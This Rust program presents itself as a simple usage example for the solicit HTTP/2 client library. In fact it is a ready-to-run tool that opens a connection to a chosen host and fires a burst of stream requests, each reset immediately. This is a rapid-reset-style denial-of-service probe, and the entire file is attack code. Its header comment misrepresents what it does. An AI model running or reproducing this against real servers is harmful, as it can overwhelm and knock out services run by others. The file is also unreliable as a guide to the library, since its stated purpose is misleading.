//! An example of usage of the `solicit::client::SimpleClient` API.
//!
//! This is a simple implementation of an HTTP/2 client, built on top of the API of `solicit::http`
//! that performs all IO in the main thread.

extern crate solicit;

use std::env;
use std::str;

use solicit::http::{HttpResult, Response, StreamId};
use solicit::http::client::CleartextConnector;
use solicit::client::SimpleClient;

fn fetch<'a>(host: &'a str, port: u16, paths: &'a [&'a str]) -> (HttpResult<Response<'a, 'a>>, Vec<HttpResult<()>>) {
    let mut client = SimpleClient::with_connector(CleartextConnector::with_port(host, port)).unwrap();

    let results = paths.iter().map(|path| {
        let stream_id = client.head(b"GET", path.as_bytes())?;
        client.reset(stream_id)
    }).collect();
    let err = client.get_response(((paths.len() * 2) - 1) as u32);
    (err, results)
}

fn main() {
    fn print_usage() {
        println!("Usage: client_simple <host>[:<port>] <path> <hits>");
        println!(
            "NOTE: The example does not accept URLs, rather the host name and a list of paths");
    }

    let host = env::args().nth(1);
    let path = env::args().nth(2);
    let size = env::args().nth(3).map_or(100, |s| s.parse::<i32>().unwrap());

    if host.is_none() || path.is_none() {
        print_usage();
        return;
    }

    let path = path.unwrap();

    let mut dups: Vec<&str> = Vec::with_capacity(size as usize);
    for _ in 0..size {
        dups.push(&path);
    }


    let host = host.unwrap();
    // Split off the port, if present
    let parts: Vec<_> = host.split(":").collect();
    if parts.len() > 2 {
        println!("Invalid host!");
        print_usage();
        return;
    }

    let (host, port) = if parts.len() == 1 {
        (parts[0], 80)
    } else {
        let port = match str::FromStr::from_str(parts[1]) {
            Err(_) => {
                println!("Invalid host (invalid port given)");
                print_usage();
                return;
            }
            Ok(port) => port,
        };
        (parts[0], port)
    };

    println!("Trying {} fast HEAD/RST frames to {}", size, host);

    let (response, results) = fetch(&host, port, &dups);
    println!("Sent {} HEAD/RST alright...", results.iter().filter(|r| r.is_ok()).count());
    match response {
        Ok(_) => println!("We got to the end ok apparently, that might be bad..."),
        Err(err) => println!("Couldn't get to reset all streams ok: {:?}", err),
    }
}
